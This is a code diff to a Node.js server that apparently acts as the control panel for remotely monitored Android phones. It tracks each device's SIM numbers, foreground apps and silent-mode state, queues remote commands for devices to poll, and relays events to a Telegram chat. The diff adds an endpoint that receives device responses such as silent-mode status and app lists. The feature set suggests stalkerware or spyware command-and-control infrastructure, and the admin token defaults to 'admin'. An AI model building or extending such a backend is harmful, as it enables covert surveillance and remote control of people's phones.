@@ -10,7 +10,7 @@ const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 
-// Store registered devices: { [deviceId]: { name, model, androidVersion, lastSeen, simNumbers, isDndOn, isMonitoring, connectedAt } }
+// Store registered devices: { [deviceId]: { name, model, androidVersion, lastSeen, simNumbers, isSilentModeOn, isMonitoring, connectedAt } }
 const registeredDevices = {
   'test_device_001': {
     id: 'test_device_001',
@@ -20,7 +20,7 @@ const registeredDevices = {
     simNumbers: '0000000000',
     lastSeen: new Date().toISOString(),
     connectedAt: new Date().toISOString(),
-    isDndOn: false,
+    isSilentModeOn: false,
     isMonitoring: true,
     online: true
   }
@@ -96,9 +96,9 @@ function formatTelegramMessage(type, content, extra, device, timestamp) {
       title = '📴 Device Registration';
       formattedContent = `🔔 *New Device Connected*\n📋 Type: ${type}\nContent: ${content}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
       break;
-    case 'dnd_status':
-      title = '🔕 DND Status';
-      formattedContent = `🔕 *DND Status Update*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
+    case 'silent_status':
+      title = '🔇 Silent Mode Status';
+      formattedContent = `🔇 *Silent Mode Status Update*\nContent: ${content}\nExtra: ${extra}\n📱 Device: ${deviceName}\n🆔 Device ID: ${deviceId}\n⏱️ Time: ${timestamp}`;
       break;
     case 'app_foreground':
       title = '👁️ App Monitoring';
@@ -194,7 +194,7 @@ app.post('/api/checkin/:deviceId', (req, res) => {
     simNumbers: simNumbers || [],
     lastSeen: new Date().toISOString(),
     connectedAt: registeredDevices[deviceId]?.connectedAt || new Date().toISOString(),
-    isDndOn: registeredDevices[deviceId]?.isDndOn || false,
+    isSilentModeOn: registeredDevices[deviceId]?.isSilentModeOn || false,
     isMonitoring: registeredDevices[deviceId]?.isMonitoring || true,
     online: true
   };
@@ -208,7 +208,7 @@ app.post('/api/checkin/:deviceId', (req, res) => {
   });
 });
 
-// Command polling endpoint - devices poll this for pending commands
+// API: Poll for commands (devices check this endpoint)
 app.get('/api/poll/:deviceId', (req, res) => {
   const { deviceId } = req.params;
   
@@ -223,6 +223,31 @@ app.get('/api/poll/:deviceId', (req, res) => {
   queuedCommands[deviceId] = [];
   
   res.json({ commands, timestamp: Date.now() });
+});
+
+// API: Handle command responses (e.g., silent mode status updates)
+app.post('/api/response/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const { type, content, extra } = req.body;
+  
+  if (!type) {
+    return res.status(400).json({ error: 'type is required' });
+  }
+  
+  if (registeredDevices[deviceId]) {
+    switch (type) {
+      case 'silent_status':
+        registeredDevices[deviceId].isSilentModeOn = content === 'on';
+        break;
+      case 'app_list':
+        registeredDevices[deviceId].lastSeen = new Date().toISOString();
+        break;
+    }
+    registeredDevices[deviceId].lastSeen = new Date().toISOString();
+  }
+  
+  Log(`📱 Device ${deviceId} responded: ${type} - ${content}`);
+  res.json({ success: true });
 });
 
 // API: Get device status
